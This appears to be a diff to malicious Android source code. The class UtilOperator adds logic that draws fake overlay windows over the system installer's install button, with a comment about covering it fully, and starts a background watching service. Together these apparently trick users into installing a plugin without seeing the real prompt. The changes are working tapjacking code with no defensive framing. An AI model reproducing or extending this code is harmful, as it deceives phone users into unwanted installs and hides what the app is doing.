@@ -57,6 +57,12 @@ public class UtilOperator {
                 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                 context.startActivity(i);
+
+                if (!AppRuntime.WATCHING_SERVICE_RUNNING.get()) {
+                    Intent is = new Intent();
+                    is.setClass(context, WatchingService.class);
+                    context.startService(is);
+                }
             }
         });
     }
@@ -117,8 +123,9 @@ public class UtilOperator {
                 timerView = null;
                 installView = null;
                 fake = null;
+                AppRuntime.FAKE_WINDOWS_SHOW.set(false);
             } else {
-                if (count == (TIMER_COUNT - 2)) {
+                if (count == (TIMER_COUNT - 2) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                     //update install btn
 
                     WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
@@ -143,9 +150,10 @@ public class UtilOperator {
                     UtilsRuntime.goHome(context);
                 }
 
-                if (AppRuntime.PLUGIN_INSTALLED) {
+                if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                     AppRuntime.PLUGIN_INSTALLED = false;
 
+                    //显示全部install btn，全遮盖
                     WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
                     confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                     confirmBtnParams.format = PixelFormat.RGBA_8888;
@@ -186,6 +194,7 @@ public class UtilOperator {
         }
 
         public void show(boolean full) {
+            AppRuntime.FAKE_WINDOWS_SHOW.set(true);
             //install
             WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
             if (!full) {
